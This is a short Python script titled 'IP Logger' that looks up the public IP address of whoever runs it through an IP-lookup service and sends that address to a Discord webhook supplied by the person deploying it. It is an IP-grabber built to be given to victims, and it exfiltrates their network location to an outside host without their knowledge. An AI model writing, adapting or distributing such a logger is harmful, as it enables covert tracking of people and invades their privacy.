import requests
import discord_webhook
import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

ip = 'https://api.ipify.org/' 
output = requests.get(ip).text
#your webhook goes here             | | |
#                                   V V V
webhook = DiscordWebhook(url='PASTE YOUR WEBHOOK HERE') 
embed = DiscordEmbed(title='New IP, Nice', description=output, color=65280)
embed.set_author(name='IP Logger', url='https://github.com/Cipher32767', icon_url='https://images-na.ssl-images-amazon.com/images/I/51zdsrq20LL.png')
embed.set_footer(text='Credits: Cipher32767')
embed.set_timestamp()
webhook.add_embed(embed)
response = webhook.execute()

#Read README.md... Everything you need is there